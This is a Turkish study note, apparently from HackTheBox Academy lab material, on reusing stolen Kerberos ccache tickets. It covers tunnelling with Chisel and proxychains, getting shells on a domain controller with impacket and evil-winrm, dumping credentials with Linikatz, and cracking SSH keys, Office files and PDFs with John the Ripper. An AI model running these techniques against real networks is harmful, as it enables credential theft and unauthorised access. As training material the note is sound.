Bir ccache dosyası kullanmak için, ccache dosyasını kopyalayabilir ve dosya yolunu `KRB5CCNAME` değişkenine atayabiliriz.

#### **ccache Dosyasını Mevcut Oturumumuza Aktarma**
```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

**Not:** klist bilet bilgilerini görüntüler. “valid starting” ve ‘expires’ değerlerini dikkate almalıyız. Son kullanma tarihi geçmişse, bilet çalışmayacaktır. `ccache dosyaları` geçicidir. Kullanıcı bunları artık kullanmıyorsa veya oturum açma ve kapatma işlemleri sırasında değişebilir veya süreleri dolabilir.


## **Linux Saldırı Araçlarını Kerberos ile Kullanma**
Windows ve Active Directory ile etkileşime giren çoğu Linux saldırı aracı Kerberos kimlik doğrulamasını destekler. Bunları domain'e bağlı bir makineden kullanıyorsak, `KRB5CCNAME` ortam değişkenimizin kullanmak istediğimiz ccache dosyasına ayarlandığından emin olmamız gerekir. Domain üyesi olmayan bir makineden, örneğin saldırı hostumuzdan saldırıyorsak, makinemizin KDC veya Domain Controller ile iletişim kurabildiğinden ve domain name resolution'ın çalıştığından emin olmamız gerekir.  

Bu senaryoda, saldırı hostumuzun `KDC/Domain` Controller ile bir bağlantısı yoktur ve Domain Controller'ı name resolution için kullanamayız. Kerberos'u kullanmak için, [Chisel](“https://github.com/jpillora/chisel”) ve [Proxychains](“https://github.com/haad/proxychains”) gibi bir araçla `MS01` üzerinden trafiğimizi proxy'lememiz ve `/etc/hosts` dosyasını, domain'in ve saldırmak istediğimiz makinelerin IP adreslerini sabit kodlayacak şekilde düzenlememiz gerekir.

#### Host File Modified

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
Proxychains yapılandırma dosyamızı socks5 ve 1080 portunu kullanacak şekilde değiştirmemiz gerekiyor.

#### Proxychains Configuration File

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```
Saldırı hostumuza [chisel](“https://github.com/jpillora/chisel”) 'ı indirmeli ve çalıştırmalıyız.


#### **Chisel'ı Saldırı Hostumuza İndirin**

```shell-session
M1R4CKCK@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
M1R4CKCK@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
M1R4CKCK@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
M1R4CKCK@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

RDP aracılığıyla `MS01` 'e bağlanın ve chisel'ı çalıştırın (C:\Tools'da bulunur).


#### **MS01'e xfreerdp ile bağlanın**

```shell-session
M1R4CKCK@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

`/dynamic-resolution` parametresi, `xfreerdp` ile uzak masaüstü bağlantısında ekran çözünürlüğünün dinamik olarak ayarlanmasını sağlar. Bu parametre aktif olduğunda, bağlantı sırasında pencerenin boyutunu değiştirdiğinizde veya ekran çözünürlüğünü değiştirdiğinizde, `xfreerdp` otomatik olarak ekranı yeni çözünürlüğe göre ayarlar. Bu, özellikle farklı monitörlere geçerken veya pencere boyutunu yeniden ayarlarken çözünürlüğün manuel olarak değiştirilmesini gereksiz hale getirir.

#### MS01'den chisel çalıştırma
```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

**Not:** Client IP sizin saldırı host IP'nizdir.  

Son olarak, Julio'nun ccache dosyasını `LINUX01` 'den aktarmamız ve ccache dosyasının yoluna karşılık gelen değerle `KRB5CCNAME` ortam değişkenini oluşturmamız gerekiyor.

#### **KRB5CCNAME Ortam Değişkeninin Ayarlanması**

```shell-session
M1R4CKCK@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket  

Kerberos biletini kullanmak için hedef makinemizin adını (IP adresini değil) belirtmemiz ve `-k` seçeneğini kullanmamız gerekir. Eğer bir parola istemi alırsak, `-no-pass` seçeneğini de ekleyebiliriz.


#### **Impacket'i proxychains ve Kerberos Kimlik Doğrulaması ile kullanma**

```shell-session
M1R4CKCK@htb[/htb]$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

**Not:** Impacket araçlarını domain'e bağlı bir Linux makineden kullanıyorsanız, bazı Linux Active Directory uygulamalarının KRB5CCNAME değişkeninde FILE: önekini kullandığını unutmayın. Bu durumda, değişkeni yalnızca ccache dosyasının yolunu içerecek şekilde değiştirmemiz gerekir.

### Evil-Winrm  

[evil-winrm](“https://github.com/Hackplayers/evil-winrm”) 'i Kerberos ile kullanmak için, ağ kimlik doğrulaması için kullanılan Kerberos paketini yüklememiz gerekir. Debian tabanlı (Parrot, Kali, vb.) gibi bazı Linux'lar için `krb5-user` olarak adlandırılır. Yükleme sırasında, Kerberos domain'i için bir prompt alacağız. Domain adını kullanın: `INLANEFREIGHT.HTB` ve KDC `DC01` `'`dir.


#### **Kerberos Kimlik Doğrulama Paketini Yükleme**

```shell-session
M1R4CKCK@htb[/htb]$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

<SNIP>
```

#### Default Kerberos Version 5 realm

![Pasted image 20241105190732.png](/img/user/resimler/Pasted%20image%2020241105190732.png)

Kerberos sunucuları boş olabilir.

#### **Kerberos Realm'iniz için Administrative Server**

![Pasted image 20241105190759.png](/img/user/resimler/Pasted%20image%2020241105190759.png)

`krb5-user` paketinin zaten kurulu olması durumunda, `/etc/krb5.conf` yapılandırma dosyasını aşağıdaki değerleri içerecek şekilde değiştirmemiz gerekir:

#### **INLANEFREIGHT.HTB için Kerberos Yapılandırma Dosyası**

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Şimdi evil-winrm'i kullanabiliriz.

#### **Evil-WinRM'i Kerberos ile Kullanma**

```shell-session
M1R4CKCK@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```


### Çok yönlü
Windows'ta bir ccache dosyası veya Linux makinede bir kirbi dosyası kullanmak istiyorsak, bunları dönüştürmek için impacket-ticketConverter'ı kullanabiliriz. Bunu kullanmak için dönüştürmek istediğimiz dosyayı ve çıktı dosya adını belirtiyoruz. Julio'nun ccache dosyasını kirbi'ye dönüştürelim.


#### Impacket Ticket Converter
```shell-session
M1R4CKCK@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Ters işlemi önce bir .kirbi dosyası seçerek yapabiliriz. Windows'ta .kirbi dosyasını kullanalım.


### Rubeus ile Dönüştürülen Bileti Windows Oturumuna Aktarma

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```


## Linikatz
Linikatz, Cisco'nun güvenlik ekibi tarafından Active Directory ile bir entegrasyon olduğunda Linux makinelerindeki kimlik bilgilerinden yararlanmak için oluşturulan bir araçtır. Başka bir deyişle Linikatz, Mimikatz'a benzer bir prensibi UNIX ortamlarına getiriyor.

Tıpkı Mimikatz gibi, Linikatz'dan yararlanmak için makinede root olmamız gerekiyor. Bu araç, FreeIPA, SSSD, Samba, Vintella gibi farklı Kerberos uygulamalarından Kerberos biletleri de dahil olmak üzere tüm kimlik bilgilerini çıkaracaktır. Kimlik bilgilerini çıkardıktan sonra, bunları adı linikatz. ile başlayan bir klasöre yerleştirir. Bu klasörün içinde, kimlik bilgilerini ccache ve keytabs dahil olmak üzere mevcut farklı biçimlerde bulacaksınız. Bunlar yukarıda açıklandığı gibi uygun şekilde kullanılabilir.


#### Linikatz Download and Execution
```shell-session
M1R4CKCK@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
M1R4CKCK@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
```

### İleriye doğru
Artık Windows ve Linux hostlardan çeşitli yanal hareket tekniklerinin nasıl gerçekleştirileceğini gördüğümüze göre, korumalı dosyaların kırılmasına dalacağız. İkinci nitelik haline gelene kadar tüm bu yanal hareket tekniklerini denemeye değer. Bir değerlendirme sırasında neyle karşılaşacağınızı asla bilemezsiniz ve kapsamlı bir araç setine sahip olmak kritik önem taşır.


Bunu sonra oku çöz : 






# Protected Files
Dosya şifreleme kullanımı özel ve ticari konularda genellikle hala eksiktir. Bugün bile iş başvuruları, hesap ekstreleri veya sözleşmeleri içeren e-postalar genellikle şifrelenmeden gönderilmektedir. Bu büyük bir ihmaldir ve hatta birçok durumda yasalarca cezalandırılabilir. Örneğin, GDPR Avrupa Birliği'nde kişisel verilerin şifreli olarak depolanmasını ve iletilmesini zorunlu kılmaktadır. Özellikle ticari durumlarda, e-postalar için bu durum oldukça farklıdır. Günümüzde, gizli konuları iletmek veya hassas verileri e-posta ile göndermek oldukça yaygındır. Ancak e-postalar, saldırganın doğru konumlandırılması halinde ele geçirilebilen kartpostallardan çok daha güvenli değildir.

Giderek daha fazla şirket, eğitim kursları ve güvenlik farkındalığı seminerleri aracılığıyla BT güvenlik önlemlerini ve altyapılarını artırıyor. Sonuç olarak, şirket çalışanlarının hassas dosyaları şifrelemesi/kodlaması giderek yaygınlaşıyor. Bununla birlikte, bunlar bile doğru liste ve araç seçimi ile kırılabilir ve okunabilir. Çoğu durumda, tek tek dosyaları veya klasörleri güvenli bir şekilde saklamak için AES-256 gibi simetrik şifreleme kullanılır. Burada, bir dosyayı şifrelemek ve şifresini çözmek için aynı anahtar kullanılır.

Bu nedenle, dosya göndermek için iki ayrı anahtarın gerekli olduğu asimetrik şifreleme kullanılır. Gönderici dosyayı alıcının public anahtarı ile şifreler. Alıcı da daha sonra private bir anahtar kullanarak dosyanın şifresini çözebilir.

## **Kodlanmış Dosyaları Arama**  

Birçok farklı dosya uzantısı bu tür şifrelenmiş/kodlanmış dosyaları tanımlayabilir. Örneğin, [FileInfo](https://fileinfo.com/filetypes/encoded)'da faydalı bir liste bulunabilir. Ancak, örneğimiz için sadece aşağıdaki gibi en yaygın dosyalara bakacağız:

#### Hunting for Files

```shell-session
cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .csv
/home/cry0l1t3/Docs/client-emails.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header-label.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/no-header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/plus.csv
/home/cry0l1t3/ruby-2.7.3/test/win32ole/orig_data.csv

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```

Sistemde aşina olmadığımız dosya uzantılarıyla karşılaşırsak, bunların arkasındaki teknolojiyi öğrenmek için aşina olduğumuz arama motorlarını kullanabiliriz. Sonuçta, yüzlerce farklı dosya uzantısı vardır ve hiç kimsenin bunların hepsini ezbere bilmesi beklenmez. Ancak öncelikle, bize yardımcı olacak ilgili bilgileri nasıl bulacağımızı bilmeliyiz. Yine, daha önce `Kimlik Bilgisi Avcılığı` bölümlerinde ele aldığımız adımları kullanabilir veya sistemdeki SSH anahtarlarını bulmak için bunları tekrarlayabiliriz.

#### Hunting for SSH Keys
```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/.ssh/SSH.private:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/Mgmt/ceil.key:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

Bugünlerde bulacağımız çoğu SSH anahtarı şifrelenmiştir. Bunu SSH anahtarının başlığından anlayabiliriz çünkü bu, kullanılan şifreleme yöntemini gösterir.

#### Encrypted SSH Keys

```shell-session
cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
...SNIP...
```

Bir SSH anahtarında böyle bir başlık görürsek, çoğu durumda başka bir işlem yapmadan hemen kullanamayız. Bunun nedeni şifrelenmiş SSH anahtarlarının kullanılmadan önce girilmesi gereken bir parola ile korunmasıdır. Ancak, SSH güvenli bir protokol olarak kabul edildiğinden çoğu kişi parola seçiminde ve karmaşıklığında dikkatsiz davranır ve çoğu kişi hafif [AES-128-CBC](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) 'nin bile kırılabileceğini bilmez.

## **John ile Cracking**  

`John The Ripper`, daha sonra kırmak için kullanabileceğimiz dosyalardan hash üretmek için birçok farklı betiğe sahiptir. Bu betikleri aşağıdaki komutu kullanarak sistemimizde bulabiliriz.


#### John Hashing Scripts

```shell-session
M1R4CKCK@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
...SNIP...
```

Birçok farklı formatı tek bir hash'e dönüştürebilir ve bununla şifreleri kırmaya çalışabiliriz. Daha sonra başarılı olursak dosyayı açabilir, okuyabilir ve kullanabiliriz. SSH anahtarları için `ssh2john.py` adında bir Python betiği vardır, bu betik şifrelenmiş SSH anahtarları için ilgili hash'leri üretir ve daha sonra bunları dosyalarda saklayabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
M1R4CKCK@htb[/htb]$ cat ssh.hash 

ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
```

Daha sonra, komutları şifre listesine göre özelleştirmemiz ve hash'lerin bulunduğu dosyamızı kırılacak hedef olarak belirtmemiz gerekir. Bundan sonra, hash dosyasını belirterek ve `--show` seçeneğini kullanarak kırılan hash'leri görüntüleyebiliriz.

#### Cracking SSH Keys
```shell-session
M1R4CKCK@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```

```shell-session
M1R4CKCK@htb[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```

## **Cracking Documents**  

Kariyerimiz boyunca, yetkisiz kişilerin erişimini önlemek için parola korumalı olan birçok farklı belgeyle karşılaşacağız. Günümüzde çoğu insan işle ilgili bilgi ve veri alışverişinde bulunmak için Office ve PDF dosyalarını kullanmaktadır.  

Hemen hemen tüm raporlar, belgeler ve bilgi formları Office DOC'leri ve PDF'leri şeklinde bulunabilir. Bunun nedeni, bilgilerin en iyi görsel temsilini sunmalarıdır. John, tüm yaygın Office belgelerinden hash'leri ayıklamak için `office2john.py` adlı bir Python script'i sağlar ve bunlar daha sonra çevrimdışı kırma için John veya Hashcat'e beslenebilir. Bunları kırma prosedürü aynı kalır.


#### Cracking Microsoft Office Documents

```shell-session
M1R4CKCK@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
M1R4CKCK@htb[/htb]$ cat protected-docx.hash

Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
```


```shell-session
M1R4CKCK@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash

Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (Protected.docx)
1g 0:00:00:00 DONE (2022-02-08 01:25) 2.083g/s 2266p/s 2266c/s 2266C/s trisha..heart
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```shell-session
M1R4CKCK@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234
```

#### Cracking PDFs

```shell-session
M1R4CKCK@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
M1R4CKCK@htb[/htb]$ cat pdf.hash 

PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
```

```shell-session
M1R4CKCK@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (PDF.pdf)
1g 0:00:00:00 DONE (2022-02-08 02:16) 25.00g/s 27200p/s 27200c/s 27200C/s bulldogs..heart
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

```shell-session
M1R4CKCK@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```

Bu süreçteki en büyük zorluklardan biri parola listelerinin oluşturulması ve mutasyona uğratılmasıdır. Bu, parola korumalı tüm dosyaların ve erişim noktalarının parolalarının başarılı bir şekilde kırılması için ön koşuldur. Çünkü çoğu durumda bilinen bir parola listesi kullanmak artık yeterli değildir, çünkü bunlar sistemler tarafından bilinir ve genellikle entegre güvenlik mekanizmaları tarafından tanınır ve engellenir. Bu tür dosyaların kırılması daha zor olabilir (veya makul bir süre içinde hiç kırılamayabilir) çünkü kullanıcılar daha uzun, rastgele oluşturulmuş bir parola veya parola cümlesi seçmek zorunda kalabilirler. Yine de, erişimimizi ilerletmek için faydalı olabilecek hassas veriler sağlayabilecekleri için parola korumalı belgeleri kırmayı denemeye her zaman değer.


